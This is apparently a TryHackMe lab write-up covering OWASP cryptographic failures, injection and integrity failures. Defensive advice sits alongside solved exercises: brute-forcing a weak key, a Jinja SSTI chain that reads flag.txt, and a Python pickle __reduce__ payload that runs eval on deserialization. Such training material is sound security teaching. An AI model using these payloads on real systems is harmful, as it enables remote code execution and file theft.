# Insecure Data Handling

Understand how A04, A05, and A08 contribute to insecure data handling.

# A04:Cryptographic Failures

**What it is**

Cryptographic failures occur when sensitive data isn’t properly protected — either because encryption is missing, implemented poorly, or keys/secrets are exposed. Examples include storing passwords without hashing, using weak or deprecated algorithms (MD5, SHA-1, DES), hard-coding keys, or failing to secure data in transit.

**Why it matters (short)**

Cryptography is the foundation for confidentiality and integrity. When it’s wrong, attackers can steal credentials, decrypt data, forge tokens, and escalate access — often without touching the rest of your code.

**Real-world anti-pattern**

Rolling your own crypto. Don’t invent algorithms or ad-hoc schemes; use vetted libraries and standard primitives.

---

## How to Prevent Cryptographic Failures (practical)

- Use modern, well-reviewed algorithms and modes (AES-GCM, ChaCha20-Poly1305).
- Hash passwords with slow, memory-hard functions: **Argon2**, **bcrypt**, or **scrypt**.
- Never hard-code keys, credentials, or secrets in source or configs. Use KMS/secret stores (AWS KMS, Azure Key Vault, HashiCorp Vault).
- Enforce TLS 1.3 with valid certificates for all network traffic.
- Rotate keys and secrets regularly; define crypto lifetimes.
- Use established crypto libraries — don’t implement primitives yourself.
- Validate and audit cryptographic usage in code reviews and automated checks.
- Protect AI/model pipelines: never bake secrets into model inputs or weights; treat models as untrusted until verified.

---

## Practical (lab instructions)

The lab app runs at:

`http://10.80.134.204:8001/`

This note-sharing web app uses a weak, shared derivative key to encrypt notes. Follow the app flow, decrypt the notes, and retrieve the flag. One note contains the flag value.

![OWASP_KEY1.png](OWASP_KEY1.png)

![OWASP_KEY@.png](OWASP_KEY.png)

**Task:** Decrypt the encrypted notes and report the flag.

Since the first three characters of the key were already known to be **“KEY”**, the full key followed the pattern `KEYx`, where `x ∈ {A–Z, a–z, 0–9}`. That gives a total of **62 possible combinations**.

I started by testing the simplest subset; the digits **0–9,** and it turned out that **`KEY1`** was the correct key for decrypting the notes.

![OWASP_KEY-03 ULTIMATE_1.png](b7a1503a-a710-4fff-97f5-284c96e8ff63.png)

1. Meeting Reminder #1

Encrypted (base64)

BiA8RSIrPhE4JjFULzA1VC9lP145ZS1eJiorQyQyeVA/ZWoRGwh3EQgqN1cuNzxfKCB5QyQqNBEJaw==

![OWASP_kEY-01.png](OWASP_kEY-01.png)

Deecrypted with KEY_:

`Meeting scheduled for tomorrow at 3 PM. Conference room B.`

1. Password Reset #2

Encrypted (base64)

GyQqQjwqK1VrNzxCLjF5XSIrMgtrLS1FOzZjHmQsN0UuNzdQJ2stWSZqK1Q4IC0OPyoyVCV4OFModGsC

![OWASP_KEY-02.png](OWASP_KEY-02.png)

Decrypted with KEY_:

`Password reset link: [https://internal.thm/reset?token=abc123](https://internal.thm/reset?token=abc123)`

1. Confidential #3

Encrypted (base64)

GAAaYw4RYxEfDRRKHAAYehQGC2gbERZuDQkYdjZldBEPKnlfJDF5QiMkK1RrMTFYOGUuWD8teUQlJCxFIyorWDEgPRE7ICtCJCs3VCdr

Decrypted with KEY_:

`SECRET: THM{WEAK_CRY………..} - Do not share this with unauthorized personnel.`

## A05: Injection

### **What Is Injection?**

Injection happens when an application accepts user-controlled input and passes it into an interpreter **without proper handling**, allowing that input to alter the execution of a command, query, or template. In other words, the application trusts input it shouldn’t.

You’ve probably seen this in the context of **SQL Injection**, where an attacker injects SQL into a login form or API parameter because the backend uses the raw input to construct a query. Instead of validating, sanitising, or parameterising, the code blindly sends attacker-controlled input to the database.

Common examples include:

- SQL Injection
- Command Injection
- Server-Side Template Injection (SSTI)
- AI Prompt Injection (a modern addition as LLMs become integrated into apps)

Despite years of awareness, injection attacks still thrive so much so that OWASP included injection twice in the 2021 list and again in 2025. It’s severe, easy to exploit, and often leads to full system compromise.

---

### **How to Prevent Injection**

The core rule is simple: **never trust user input**.

Secure applications treat all external data as hostile and enforce strict controls before using it anywhere sensitive.

Key defences:

- Use **prepared statements and parameterised queries**. Never build SQL queries with string concatenation.
- Avoid passing user input to the **system shell**. Use safe APIs that don’t invoke OS commands.
- **Validate and sanitise** all inputs; enforce strict types, whitelist acceptable characters, and reject malformed data early.
- Properly escape special characters in templating environments.
- For modern applications using LLMs, isolate system prompts from user-controlled prompts to avoid prompt injection.

---

### **Practical**

This task demonstrates **Server-Side Template Injection (SSTI)** using a vulnerable web application hosted at:

[`http://10.82.147.66:8000/`](http://10.82.147.66:8000/)

Your goal:

Exploit the SSTI vulnerability to read the contents of **`flag.txt`**, located in the same directory as the application.

### **Recommended TryHackMe Content**

If you want to go deeper into injection exploitation, study these rooms:

- **Injection Attacks Module**
- **Command Injection**

Perform the SSTI attack and extract the flag.

- **Prove code execution**
    
    Submit the expression:
    
    ```
    {{ 7 * 7 }}
    ```
    
    If the response evaluates to `49`, the template engine is executing expressions.
    
- **Enumerate the template context**
    
    Probe objects available to the template to see what you can access. Example probes:
    
    ```
    {{ config.items() }}
    {{ request.__dict__ }}
    ```
    
    Use these to discover Flask globals, request objects, and other exposed variables.
    
- **Read the flag**
    
    Jinja can expose Flask globals. If available, read the file directly from the server:
    
    ```
    {{ request.application.__globals__.__builtins__.open('flag.txt').read() }}
    ```
    
    This will return the contents of `flag.txt` if the builtins and file access are reachable from the template context.
    

## A08: Software or Data Integrity Failures

### **What Are Software or Data Integrity Failures?**

Software or Data Integrity Failures occur when an application blindly trusts code, updates, or data without verifying where they came from or whether they’ve been tampered with. This includes:

- Trusting software updates without validation
- Loading scripts, config files, or binaries from untrusted sources
- Accepting data (JSON, templates, serialized objects, etc.) that influence logic without confirming authenticity
- Allowing critical artefacts to be modified without integrity checks

When an attacker can alter what the application loads, processes, or executes, they can easily inject malicious behaviour straight into the system.

---

### **How to Avoid Software & Data Integrity Failures**

Preventing these failures is all about enforcing *trust boundaries*. Nothing—code, updates, or critical data; should be assumed safe by default. You mitigate this by:

- Verifying updates and packages using signatures or checksums
- Restricting who and what can modify critical files or build artefacts
- Hardening CI/CD pipelines against tampering
- Ensuring all external scripts, dependencies, and data sources come from trusted origins
- Monitoring for unexpected changes to application components

If integrity is weak anywhere in the chain, everything above it collapses.

---

### **Practical**

This task demonstrates a Python deserialization attack. Access the web app at:

[**http://10.82.147.66:8002**](http://10.82.147.66:8002/)

Your goal: craft a malicious Python pickle payload that executes code on deserialization and reads `flag.txt`.

---

### **Recommended TryHackMe Content**

- **Insecure Deserialisation**
- **Supply Chain Attack: Lottie**

---

### **Challenge**

**Create a malicious pickle payload that reads `flag.txt`, submit it to the app, and retrieve the flag.**

### **Solution Steps**

- Write a Python script that generates a malicious pickle payload capable of reading `flag.txt`.
- Implement `__reduce__` so the pickle deserialization triggers a file read operation.
- Base64-encode the resulting payload so it can be submitted through the web form.
- Submit the encoded payload to the application.
- Once deserialized, the server will execute the payload and return the contents of `flag.txt`.

---

### **Example Python Code for Generating the Payload**

```python
import pickle
import base64

class Malicious:
    def __reduce__(self):
        # Executes: open('flag.txt').read()
        return (eval, ("open('flag.txt').read()",))

# Generate and encode the payload
payload = pickle.dumps(Malicious())
encoded = base64.b64encode(payload).decode()

print(encoded)
```

![OWASP--1.png](OWASP--1.png)

Crafting Payload on Attacker Machine

![OWASP--2.png](OWASP--2.png)

Run Payload

![OWASP--3.png](OWASP--3.png)

Paste the printed Base64 string into the form to trigger the vulnerability and retrieve the flag.

FLAG: `THM{INSECURE_……………………}`